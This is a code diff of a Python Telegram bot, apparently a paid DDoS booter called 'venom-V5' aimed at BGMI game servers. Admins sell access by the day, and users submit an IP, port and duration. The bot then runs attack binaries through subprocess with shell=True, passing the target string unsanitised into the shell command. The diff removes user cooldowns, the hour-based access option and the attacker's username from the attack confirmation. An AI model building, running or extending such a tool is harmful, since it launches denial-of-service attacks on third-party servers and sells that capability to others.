@@ -15,8 +15,8 @@ from requests.exceptions import ReadTimeout, ConnectionError
 
 # Load configuration
 CONFIG_FILE = 'config.json'
-ORIGINAL_BGMI_PATH = '/workspaces/venom-V5/bgmi'      # ADD YOUR FILES PATH HERE 
-ORIGINAL_VENOM_PATH = '/workspaces/venom-V5/bgmi2'    # ADD YOUR FILES PATH HERE 
+ORIGINAL_BGMI_PATH = '/workspaces/venom-V5/bgmi'      
+ORIGINAL_VENOM_PATH = '/workspaces/venom-V5/bgmi2'    
 
 def update_proxy():    
     proxy_list = [
@@ -65,7 +65,7 @@ ADMIN_IDS = set(config['admin_ids'])
 USER_FILE = config['user_file']
 LOG_FILE = config['log_file']
 COOLDOWN_TIME = config['cooldown_time']
-USER_COOLDOWN = 300  # Cooldown time for normal users in seconds
+USER_COOLDOWN = 300  
 
 admin_balances = config.get('admin_balances', {})
 bgmi_cooldown = {}
@@ -73,7 +73,6 @@ ongoing_attacks = {}
 allowed_user_ids = {}
 user_cooldowns = {}
 
-# User management functions
 def read_users():
     try:
         with open(USER_FILE, 'r') as f:
@@ -96,7 +95,6 @@ def check_expired_users():
     if expired_users:
         write_users(allowed_user_ids)
 
-# Logging functions
 def log_command(user_id, target, port, duration):
     try:
         user = bot.get_chat(user_id)
@@ -113,7 +111,6 @@ def clear_logs():
         return "Logs cleared successfully ✅"
     return "Logs are already cleared. No data found."
 
-# Bot command handlers
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
     welcome_message = (
@@ -130,8 +127,6 @@ def send_welcome(message):
 def add_user(message):
     if str(message.chat.id) in ADMIN_IDS:
         args = message.text.split()
-        admin_user = bot.get_chat(message.chat.id)
-        admin_username = f"@{admin_user.username}" if admin_user.username else f"UserID: {message.chat.id}"
         if len(args) == 3:
             user_id, duration = args[1], int(args[2])
             cost = duration * 100
@@ -143,38 +138,16 @@ def add_user(message):
                 config['admin_balances'] = admin_balances
                 write_config(config)
 
-                # Create copies of bgmi, sahil files for the new user
                 user_bgmi_path = f'bgmi{user_id}'
                 user_venom_path = f'venom{user_id}'
                 shutil.copy(ORIGINAL_BGMI_PATH, user_bgmi_path)
                 shutil.copy(ORIGINAL_VENOM_PATH, user_venom_path)
 
-                response = f"User {user_id} added successfully for {duration} days by {admin_username} 👍. Balance deducted: {cost} Rs. Remaining balance: {admin_balances[str(message.chat.id)]} Rs."
-            else:
-                response = f"Insufficient balance to add user. Required: {cost} Rs. Available: {admin_balances[str(message.chat.id)]} Rs."
-        elif len(args) == 4 and args[2] == 'hours':
-            user_id, hours = args[1], int(args[3])
-            duration = hours / 24  # Convert hours to days for costing
-            cost = int(duration * 100)
-            if admin_balances[str(message.chat.id)] >= cost:
-                expiry_time = datetime.datetime.now() + datetime.timedelta(hours=hours)
-                allowed_user_ids[user_id] = expiry_time
-                write_users(allowed_user_ids)
-                admin_balances[str(message.chat.id)] -= cost
-                config['admin_balances'] = admin_balances
-                write_config(config)
-
-                # Create copies of bgmi, sahil files for the new user
-                user_bgmi_path = f'bgmi{user_id}'              
-                user_venom_path = f'venom{user_id}'
-                shutil.copy(ORIGINAL_BGMI_PATH, user_bgmi_path)
-                shutil.copy(ORIGINAL_VENOM_PATH, user_venom_path)
-
-                response = f"User {user_id} added successfully for {hours} hours by {admin_username} 👍. Balance deducted: {cost} Rs. Remaining balance: {admin_balances[str(message.chat.id)]} Rs."
+                response = f"User {user_id} added successfully for {duration} days. Balance deducted: {cost} Rs. Remaining balance: {admin_balances[str(message.chat.id)]} Rs."
             else:
                 response = f"Insufficient balance to add user. Required: {cost} Rs. Available: {admin_balances[str(message.chat.id)]} Rs."
         else:
-            response = "Usage: /add <userId> <duration_in_days> or /add <userId> hours <duration_in_hours>"
+            response = "Usage: /add <userId> <duration_in_days>"
     else:
         response = "ONLY OWNER CAN USE."
     bot.send_message(message.chat.id, response)
@@ -183,14 +156,12 @@ def add_user(message):
 def remove_user(message):
     if str(message.chat.id) in ADMIN_IDS:
         args = message.text.split()
-        admin_user = bot.get_chat(message.chat.id)
-        admin_username = f"@{admin_user.username}" if admin_user.username else f"UserID: {message.chat.id}"
         if len(args) > 1:
             user_id = args[1]
             if user_id in allowed_user_ids:
                 del allowed_user_ids[user_id]
                 write_users(allowed_user_ids)
-                response = f"User ID: {user_id} removed Successfully by {admin_username}."
+                response = f"User ID: {user_id} removed Successfully."
             else:
                 response = f"User {user_id} Not found in the list."
         else:
@@ -242,17 +213,13 @@ def start_attack(user_id, target, port, duration):
     attack_id = f"{user_id} {target} {port}"
     bgmi_file = f"bgmi{user_id}"
     venom_file = f"venom{user_id}"
-    user = bot.get_chat(user_id)
-    username = f"@{user.username}" if user.username else f"UserID: {user_id}"
     log_command(user_id, target, port, duration)
-    response = f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆! 🚀\n\n𝗧𝗮𝗿𝗴𝗲𝘁: {target}:{port}\n𝗔𝘁𝘁𝗮𝗰𝗸 𝗧𝗶𝗺𝗲: {duration}\n𝗔𝘁𝘁𝗮𝗰𝗸𝗲𝗿 𝗡𝗮𝗺𝗲: {username}"
+    response = f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆! 🚀\n\n𝗧𝗮𝗿𝗴𝗲𝘁: {target}:{port}\n𝗔𝘁𝘁𝗮𝗰𝗸 𝗧𝗶𝗺𝗲: {duration}"
     bot.send_message(user_id, response)
     try:
         ongoing_attacks[attack_id] = subprocess.Popen(f"./{bgmi_file} {target} {port} {duration} 200", shell=True)
         time.sleep(5)
         subprocess.run(f"./{venom_file} {target} {port} {duration} 200", shell=True)
-        if user_id not in ADMIN_IDS:
-            user_cooldowns[user_id] = datetime.datetime.now()
     except Exception as e:
         bot.send_message(user_id, f"Error: Servers Are Busy Unable To Attack\n{e}")
 
@@ -263,7 +230,7 @@ def handle_attack_button(message):
         bot.send_message(message.chat.id, "✅ 𝗣𝗹𝗲𝗮𝘀𝗲 𝗣𝗿𝗼𝘃𝗶𝗱𝗲 <𝗜𝗣> <𝗣𝗢𝗥𝗧> <𝗧𝗜𝗠𝗘>")
         bot.register_next_step_handler(message, handle_attack_details)
     else:
-        bot.send_message(message.chat.id, "🚫 𝗨𝗻𝗮𝘂𝘁𝗼𝗿𝗶𝘀𝗲𝗱 𝗔𝗰𝗰𝗲𝘀𝘀! 🚫\n\nOops! It seems like you don't have permission to use the Attack command. To gain access and unleash the power of attacks, you can:\n\n👉 Contact an Admin or the Owner for approval.\n🌟 Become a proud supporter and purchase approval.\n💬 Chat with an admin now and level up your experience!\n\nLet's get you the access you need!")
+        bot.send_message(message.chat.id, "🚫 𝗨𝗻𝗮𝘂𝘁𝗼𝗿𝗶𝘀𝗲𝗱 𝗔𝗰𝗰𝗲𝘀𝘀! 🚫")
 
 def handle_attack_details(message):
     user_id = str(message.chat.id)
@@ -272,18 +239,11 @@ def handle_attack_details(message):
             target, port, duration = message.text.split()
             duration = int(duration)
 
-            MAX_DURATION = 240  # Set maximum duration (in seconds) for Normal users
-            if user_id not in ADMIN_IDS and duration > MAX_DURATION:
+            MAX_DURATION = 240  
+            if duration > MAX_DURATION:
                 bot.send_message(message.chat.id, f"❗️𝗘𝗿𝗿𝗼𝗿: 𝗠𝗮𝘅𝗶𝗺𝘂𝗺 𝗨𝘀𝗮𝗴𝗲 𝗧𝗶𝗺𝗲 𝗶𝘀 {MAX_DURATION} 𝗦𝗲𝗰𝗼𝗻𝗱𝘀❗️")
                 return
 
-            if user_id not in ADMIN_IDS:
-                if user_id in user_cooldowns:
-                    elapsed_time = (datetime.datetime.now() - user_cooldowns[user_id]).total_seconds()
-                    if elapsed_time < USER_COOLDOWN:
-                        cooldown_remaining = int(USER_COOLDOWN - elapsed_time)
-                        bot.send_message(message.chat.id, f"𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻 𝗶𝗻 𝗘𝗳𝗳𝗲𝗰𝘁. 𝗣𝗹𝗲𝗮𝘀𝗲 𝗪𝗮𝗶𝘁 {cooldown_remaining} 𝗦𝗲𝗰𝗼𝗻𝗱𝘀")
-                        return
             thread = Thread(target=start_attack, args=(user_id, target, port, duration))
             thread.start()
         except ValueError:
@@ -328,10 +288,10 @@ def broadcast_message(msg):
 # Main loop
 if __name__ == '__main__':
     check_expired_users()
-    Timer(86400, check_expired_users).start()  # Run check_expired_users every 24 hours
+    Timer(86400, check_expired_users).start()  
     while True:
         try:
-            bot.polling(none_stop=True, interval=1, timeout=60)  # Increased timeout value
+            bot.polling(none_stop=True, interval=1, timeout=60)  
         except ReadTimeout:
             print("ReadTimeout occurred. Retrying...")
         except ConnectionError:
@@ -339,5 +299,3 @@ if __name__ == '__main__':
         except Exception as e:
             print(f"Unexpected error: {e}")
             time.sleep(1)
-
-
